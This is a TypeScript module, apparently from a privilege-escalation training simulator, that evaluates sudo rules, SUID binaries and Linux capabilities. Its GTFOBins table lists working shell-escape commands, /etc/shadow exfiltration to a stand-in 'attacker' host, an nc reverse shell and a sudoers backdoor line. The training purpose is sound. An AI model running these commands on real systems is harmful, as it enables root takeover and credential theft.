/**
 * VARIANT — PAM/sudo Policy Engine
 *
 * Evaluates sudo rules, SUID binaries, and Linux capabilities
 * for privilege escalation training. Simulates real Linux
 * privilege mechanisms with full rule evaluation.
 *
 * What it does:
 *   - Parses and evaluates sudoers rules with aliases
 *   - Tracks SUID/SGID binaries with GTFOBins exploitation data
 *   - Evaluates Linux capabilities on binaries
 *   - Scans for all known privilege escalation vectors
 *   - Generates realistic `sudo -l` and `find -perm -4000` output
 *
 * SWAPPABILITY: Implements PamEngine. Replace this file.
 */

import type {
    PamEngine,
    SudoersConfig,
    SudoRule,
    SudoEvalResult,
    SUIDEntry,
    CapabilityEntry,
    PrivescVector,
    PamModuleConfig,
    PamStats,
} from './types';

// ── GTFOBins Database ──────────────────────────────────────

const GTFOBINS: ReadonlyMap<string, { exploit: string; steps: readonly string[] }> = new Map([
    ['find', { exploit: 'find -exec shell', steps: ['find . -exec /bin/sh -p \\; -quit'] }],
    ['vim', { exploit: 'vim shell escape', steps: ['vim -c ":!/bin/sh"'] }],
    ['vi', { exploit: 'vi shell escape', steps: ['vi -c ":!/bin/sh"'] }],
    ['nmap', { exploit: 'nmap interactive', steps: ['nmap --interactive', '!sh'] }],
    ['less', { exploit: 'less shell escape', steps: ['less /etc/passwd', '!/bin/sh'] }],
    ['more', { exploit: 'more shell escape', steps: ['more /etc/passwd', '!/bin/sh'] }],
    ['nano', { exploit: 'nano command execution', steps: ['nano', 'Ctrl+R, Ctrl+X', '/bin/sh'] }],
    ['awk', { exploit: 'awk exec', steps: ["awk 'BEGIN {system(\"/bin/sh\")}'"] }],
    ['perl', { exploit: 'perl exec', steps: ['perl -e \'exec "/bin/sh";\''] }],
    ['python', { exploit: 'python exec', steps: ['python -c \'import os; os.execl("/bin/sh","sh")\''] }],
    ['python3', { exploit: 'python3 exec', steps: ['python3 -c \'import os; os.execl("/bin/sh","sh")\''] }],
    ['ruby', { exploit: 'ruby exec', steps: ['ruby -e \'exec "/bin/sh"\''] }],
    ['lua', { exploit: 'lua exec', steps: ['lua -e \'os.execute("/bin/sh")\''] }],
    ['env', { exploit: 'env shell', steps: ['env /bin/sh -p'] }],
    ['cp', { exploit: 'cp overwrite', steps: ['cp /bin/sh /tmp/sh', 'chmod +s /tmp/sh', '/tmp/sh -p'] }],
    ['mv', { exploit: 'mv replace', steps: ['mv /bin/sh /tmp/sh'] }],
    ['tar', { exploit: 'tar checkpoint', steps: ['tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh'] }],
    ['zip', { exploit: 'zip exec', steps: ['zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/sh"'] }],
    ['gcc', { exploit: 'gcc wrapper', steps: ['gcc -wrapper /bin/sh,-s .'] }],
    ['gdb', { exploit: 'gdb exec', steps: ['gdb -nx -ex \'python import os; os.execl("/bin/sh","sh")\' -ex quit'] }],
    ['strace', { exploit: 'strace exec', steps: ['strace -o /dev/null /bin/sh -p'] }],
    ['ltrace', { exploit: 'ltrace exec', steps: ['ltrace -b -L /bin/sh -p'] }],
    ['bash', { exploit: 'bash -p', steps: ['bash -p'] }],
    ['dash', { exploit: 'dash -p', steps: ['dash -p'] }],
    ['sh', { exploit: 'sh -p', steps: ['sh -p'] }],
    ['wget', { exploit: 'wget post-file', steps: ['wget --post-file=/etc/shadow http://attacker/'] }],
    ['curl', { exploit: 'curl file exfil', steps: ['curl file:///etc/shadow', 'curl -X POST -d @/etc/shadow http://attacker/'] }],
    ['socat', { exploit: 'socat reverse shell', steps: ['socat stdin exec:/bin/sh'] }],
    ['nc', { exploit: 'nc reverse shell', steps: ['nc -e /bin/sh attacker 4444'] }],
    ['node', { exploit: 'node exec', steps: ["node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"] }],
    ['php', { exploit: 'php exec', steps: ['php -r \'pcntl_exec("/bin/sh", ["-p"]);\''] }],
    ['docker', { exploit: 'docker mount', steps: ['docker run -v /:/mnt --rm -it alpine chroot /mnt sh'] }],
    ['pkexec', { exploit: 'pkexec shell', steps: ['pkexec /bin/sh'] }],
    ['tee', { exploit: 'tee file write', steps: ['echo "user ALL=(ALL) NOPASSWD: ALL" | tee -a /etc/sudoers'] }],
    ['ed', { exploit: 'ed shell escape', steps: ['ed', '!/bin/sh'] }],
    ['man', { exploit: 'man shell escape', steps: ['man man', '!/bin/sh'] }],
    ['ftp', { exploit: 'ftp shell escape', steps: ['ftp', '!/bin/sh'] }],
    ['ssh', { exploit: 'ssh ProxyCommand', steps: ['ssh -o ProxyCommand=";sh 0<&2 1>&2" x'] }],
    ['scp', { exploit: 'scp shell', steps: ['TF=$(mktemp)', 'echo \'sh 0<&2 1>&2\' > $TF', 'chmod +x $TF', 'scp -S $TF x: y:'] }],
    ['systemctl', { exploit: 'systemctl pager', steps: ['systemctl', '!sh'] }],
    ['journalctl', { exploit: 'journalctl pager', steps: ['journalctl', '!/bin/sh'] }],
    ['service', { exploit: 'service shell', steps: ['service ../../tmp/exploit'] }],
]);

// ── Capability Exploitation Database ───────────────────────

const EXPLOITABLE_CAPS: ReadonlyMap<string, string> = new Map([
    ['CAP_SETUID', 'Can change UID — direct privilege escalation to root'],
    ['CAP_SETGID', 'Can change GID — escalate to any group'],
    ['CAP_DAC_OVERRIDE', 'Bypass all file read/write permission checks'],
    ['CAP_DAC_READ_SEARCH', 'Bypass file read permission checks and directory traversal'],
    ['CAP_SYS_ADMIN', 'Overly broad — mount filesystems, trace processes, set hostname'],
    ['CAP_SYS_PTRACE', 'Can inject code into running processes via ptrace'],
    ['CAP_SYS_MODULE', 'Can load kernel modules — rootkit insertion'],
    ['CAP_NET_RAW', 'Can sniff network traffic and forge packets'],
    ['CAP_NET_ADMIN', 'Can modify network configuration, firewall rules, routing'],
    ['CAP_CHOWN', 'Can change file ownership — take ownership of /etc/shadow'],
    ['CAP_FOWNER', 'Bypass permission checks on operations requiring UID match'],
]);

// ── Factory ────────────────────────────────────────────────

export function createPamEngine(config?: SudoersConfig): PamEngine {
    const sudoRules: SudoRule[] = config?.rules ? [...config.rules] : [];
    const sudoDefaults = config?.defaults ? [...config.defaults] : [];
    const aliases = config?.aliases ?? {};
    const suidEntries: SUIDEntry[] = [];
    const capEntries: CapabilityEntry[] = [];
    const pamStacks = new Map<string, PamModuleConfig[]>();

    // Default PAM stacks
    pamStacks.set('login', [
        { type: 'auth', control: 'required', module: 'pam_securetty.so' },
        { type: 'auth', control: 'required', module: 'pam_unix.so', args: ['nullok'] },
        { type: 'account', control: 'required', module: 'pam_unix.so' },
        { type: 'session', control: 'required', module: 'pam_unix.so' },
    ]);
    pamStacks.set('sudo', [
        { type: 'auth', control: 'required', module: 'pam_unix.so' },
        { type: 'account', control: 'required', module: 'pam_unix.so' },
        { type: 'session', control: 'required', module: 'pam_limits.so' },
    ]);
    pamStacks.set('su', [
        { type: 'auth', control: 'sufficient', module: 'pam_rootok.so' },
        { type: 'auth', control: 'required', module: 'pam_unix.so' },
        { type: 'account', control: 'required', module: 'pam_unix.so' },
        { type: 'session', control: 'required', module: 'pam_unix.so' },
    ]);
    pamStacks.set('sshd', [
        { type: 'auth', control: 'required', module: 'pam_unix.so' },
        { type: 'account', control: 'required', module: 'pam_unix.so' },
        { type: 'session', control: 'required', module: 'pam_loginuid.so' },
        { type: 'session', control: 'required', module: 'pam_unix.so' },
    ]);

    function resolveAlias(type: 'user' | 'host' | 'cmnd' | 'runas', name: string): readonly string[] {
        const aliasMap = {
            user: aliases.userAliases,
            host: aliases.hostAliases,
            cmnd: aliases.cmndAliases,
            runas: aliases.runasAliases,
        }[type];
        if (aliasMap === undefined) return [name];
        const resolved = aliasMap[name];
        return resolved ?? [name];
    }

    function matchesUser(ruleUser: string, user: string): boolean {
        if (ruleUser === 'ALL') return true;
        if (ruleUser === user) return true;
        if (ruleUser.startsWith('%')) return false; // Group matching would need group data
        const resolved = resolveAlias('user', ruleUser);
        return resolved.includes(user) || resolved.includes('ALL');
    }

    function matchesCommand(ruleCommands: readonly string[], command: string): boolean {
        const cmdBase = command.split(/\s+/)[0] ?? command;

        for (const ruleCmd of ruleCommands) {
            if (ruleCmd === 'ALL') return true;

            // Resolve aliases
            const resolved = resolveAlias('cmnd', ruleCmd);
            for (const resolvedCmd of resolved) {
                if (resolvedCmd === 'ALL') return true;
                if (resolvedCmd === command) return true;
                if (resolvedCmd === cmdBase) return true;

                // Wildcard: /usr/bin/* matches /usr/bin/anything
                if (resolvedCmd.endsWith('/*')) {
                    const prefix = resolvedCmd.slice(0, -1);
                    if (command.startsWith(prefix) || cmdBase.startsWith(prefix)) return true;
                }

                // Negation: !command means NOT this command
                if (resolvedCmd.startsWith('!')) {
                    const negated = resolvedCmd.slice(1);
                    if (negated === command || negated === cmdBase) return false;
                }
            }
        }
        return false;
    }

    function getBinaryName(path: string): string {
        const parts = path.split('/');
        return parts[parts.length - 1] ?? path;
    }

    return {
        evaluateSudo(user: string, command: string, runAs?: string): SudoEvalResult {
            const targetUser = runAs ?? 'root';

            // Evaluate rules in order (last match wins in real sudo, but first match is more common in sims)
            let lastMatch: SudoRule | null = null;

            for (const rule of sudoRules) {
                if (!matchesUser(rule.user, user)) continue;
                if (!matchesCommand(rule.commands, command)) continue;

                // Check runAs
                if (rule.runAs !== 'ALL' && rule.runAs !== targetUser) {
                    const resolved = resolveAlias('runas', rule.runAs);
                    if (!resolved.includes(targetUser) && !resolved.includes('ALL')) continue;
                }

                lastMatch = rule;
            }

            if (lastMatch !== null) {
                return {
                    allowed: true,
                    matchedRule: lastMatch,
                    requiresPassword: !lastMatch.noPasswd,
                    runAsUser: targetUser,
                    reason: `Matched rule: ${lastMatch.user} ${lastMatch.host}=(${lastMatch.runAs}) ${lastMatch.noPasswd ? 'NOPASSWD: ' : ''}${lastMatch.commands.join(', ')}`,
                };
            }

            return {
                allowed: false,
                matchedRule: null,
                requiresPassword: false,
                runAsUser: targetUser,
                reason: `User ${user} is not allowed to run '${command}' as ${targetUser}`,
            };
        },

        getUserRules(user: string): readonly SudoRule[] {
            return sudoRules.filter(r => matchesUser(r.user, user));
        },

        getSUIDEntries(): readonly SUIDEntry[] {
            return [...suidEntries];
        },

        getCapabilities(): readonly CapabilityEntry[] {
            return [...capEntries];
        },

        scanPrivescVectors(currentUser: string): readonly PrivescVector[] {
            const vectors: PrivescVector[] = [];

            // Scan sudo rules
            for (const rule of sudoRules) {
                if (!matchesUser(rule.user, currentUser)) continue;

                if (rule.noPasswd) {
                    for (const cmd of rule.commands) {
                        if (cmd === 'ALL') {
                            vectors.push({
                                type: 'sudo',
                                path: 'ALL',
                                description: `User ${currentUser} can run ANY command as ${rule.runAs} without password`,
                                severity: 'critical',
                                exploitSteps: [`sudo -u ${rule.runAs} /bin/sh`],
                                mitreTechnique: 'T1548.003',
                            });
                        } else {
                            const binary = getBinaryName(cmd);
                            const gtfo = GTFOBINS.get(binary);
                            if (gtfo !== undefined) {
                                vectors.push({
                                    type: 'sudo',
                                    path: cmd,
                                    description: `sudo NOPASSWD: ${cmd} — GTFOBins: ${gtfo.exploit}`,
                                    severity: 'high',
                                    exploitSteps: [`sudo -u ${rule.runAs} ${gtfo.steps[0]}`],
                                    mitreTechnique: 'T1548.003',
                                });
                            }
                        }
                    }
                }
            }

            // Scan SUID binaries
            for (const entry of suidEntries) {
                if (!entry.suid) continue;
                const binary = getBinaryName(entry.path);
                const gtfo = GTFOBINS.get(binary);

                if (gtfo !== undefined || entry.exploitable) {
                    vectors.push({
                        type: 'suid',
                        path: entry.path,
                        description: entry.gtfobinsExploit ?? gtfo?.exploit ?? `SUID binary: ${entry.path}`,
                        severity: entry.owner === 'root' ? 'high' : 'medium',
                        exploitSteps: gtfo?.steps ?? [entry.path],
                        mitreTechnique: 'T1548.001',
                    });
                }
            }

            // Scan capabilities
            for (const entry of capEntries) {
                for (const cap of entry.capabilities) {
                    const desc = EXPLOITABLE_CAPS.get(cap);
                    if (desc !== undefined) {
                        vectors.push({
                            type: 'capability',
                            path: entry.path,
                            description: `${entry.path} has ${cap}: ${desc}`,
                            severity: cap === 'CAP_SETUID' || cap === 'CAP_SYS_ADMIN' ? 'critical' : 'high',
                            exploitSteps: [`getcap ${entry.path}`, `Use ${cap} to escalate`],
                            mitreTechnique: 'T1548.001',
                        });
                    }
                }
            }

            return vectors;
        },

        formatSudoers(): string {
            const lines: string[] = [];

            // Defaults
            for (const def of sudoDefaults) {
                const val = typeof def.value === 'boolean'
                    ? (def.value ? def.key : `!${def.key}`)
                    : `${def.key}=${def.value}`;
                lines.push(`Defaults\t${val}`);
            }
            if (sudoDefaults.length > 0) lines.push('');

            // Aliases
            if (aliases.userAliases !== undefined) {
                for (const [name, members] of Object.entries(aliases.userAliases)) {
                    lines.push(`User_Alias ${name} = ${members.join(', ')}`);
                }
            }
            if (aliases.cmndAliases !== undefined) {
                for (const [name, members] of Object.entries(aliases.cmndAliases)) {
                    lines.push(`Cmnd_Alias ${name} = ${members.join(', ')}`);
                }
            }
            if (Object.keys(aliases).length > 0) lines.push('');

            // Rules
            for (const rule of sudoRules) {
                const noPasswd = rule.noPasswd ? 'NOPASSWD: ' : '';
                lines.push(`${rule.user}\t${rule.host}=(${rule.runAs}) ${noPasswd}${rule.commands.join(', ')}`);
            }

            return lines.join('\n');
        },

        formatSUIDList(): string {
            return suidEntries
                .filter(e => e.suid || e.sgid)
                .map(e => {
                    const perms = e.permissions.toString(8).padStart(4, '0');
                    const suidFlag = e.suid ? 's' : '-';
                    const sgidFlag = e.sgid ? 's' : '-';
                    return `-rw${suidFlag}r-${sgidFlag}r-x 1 ${e.owner} ${e.group} ${e.path}  [${perms}]`;
                })
                .join('\n');
        },

        addSudoRule(rule: SudoRule): void {
            sudoRules.push(rule);
        },

        addSUIDEntry(entry: SUIDEntry): void {
            const binary = getBinaryName(entry.path);
            const gtfo = GTFOBINS.get(binary);
            const exploit = entry.gtfobinsExploit ?? gtfo?.exploit;
            const base = {
                ...entry,
                exploitable: entry.exploitable || gtfo !== undefined,
            };
            const enriched: SUIDEntry = exploit !== undefined
                ? { ...base, gtfobinsExploit: exploit }
                : base;
            suidEntries.push(enriched);
        },

        addCapability(entry: CapabilityEntry): void {
            const exploitable = entry.exploitable || entry.capabilities.some(c => EXPLOITABLE_CAPS.has(c));
            const desc = entry.capabilities
                .map(c => EXPLOITABLE_CAPS.get(c))
                .filter(d => d !== undefined)
                .join('; ');
            const descValue = entry.exploitDescription ?? (desc !== '' ? desc : undefined);
            const capBase = {
                ...entry,
                exploitable,
            };
            capEntries.push(
                descValue !== undefined
                    ? { ...capBase, exploitDescription: descValue }
                    : capBase
            );
        },

        getPamStack(service: string): readonly PamModuleConfig[] {
            return pamStacks.get(service) ?? [];
        },

        setPamStack(service: string, modules: readonly PamModuleConfig[]): void {
            pamStacks.set(service, [...modules]);
        },

        getStats(): PamStats {
            return {
                totalSudoRules: sudoRules.length,
                totalSUIDEntries: suidEntries.length,
                totalCapabilities: capEntries.length,
                exploitableSUID: suidEntries.filter(e => e.exploitable).length,
                exploitableCapabilities: capEntries.filter(e => e.exploitable).length,
                noPasswdRules: sudoRules.filter(r => r.noPasswd).length,
            };
        },
    };
}

/**
 * Bootstrap a realistic Linux machine with common SUID binaries.
 */
export function bootstrapLinuxSUID(engine: PamEngine): void {
    const commonSUID: Array<{ path: string; owner: string; group: string }> = [
        { path: '/usr/bin/passwd', owner: 'root', group: 'root' },
        { path: '/usr/bin/chsh', owner: 'root', group: 'root' },
        { path: '/usr/bin/chfn', owner: 'root', group: 'root' },
        { path: '/usr/bin/newgrp', owner: 'root', group: 'root' },
        { path: '/usr/bin/sudo', owner: 'root', group: 'root' },
        { path: '/usr/bin/su', owner: 'root', group: 'root' },
        { path: '/usr/bin/mount', owner: 'root', group: 'root' },
        { path: '/usr/bin/umount', owner: 'root', group: 'root' },
        { path: '/usr/bin/gpasswd', owner: 'root', group: 'root' },
        { path: '/usr/bin/pkexec', owner: 'root', group: 'root' },
        { path: '/usr/lib/openssh/ssh-keysign', owner: 'root', group: 'root' },
        { path: '/usr/lib/dbus-1.0/dbus-daemon-launch-helper', owner: 'root', group: 'messagebus' },
    ];

    for (const bin of commonSUID) {
        engine.addSUIDEntry({
            path: bin.path,
            owner: bin.owner,
            group: bin.group,
            permissions: 0o4755,
            suid: true,
            sgid: false,
            exploitable: false,
        });
    }
}
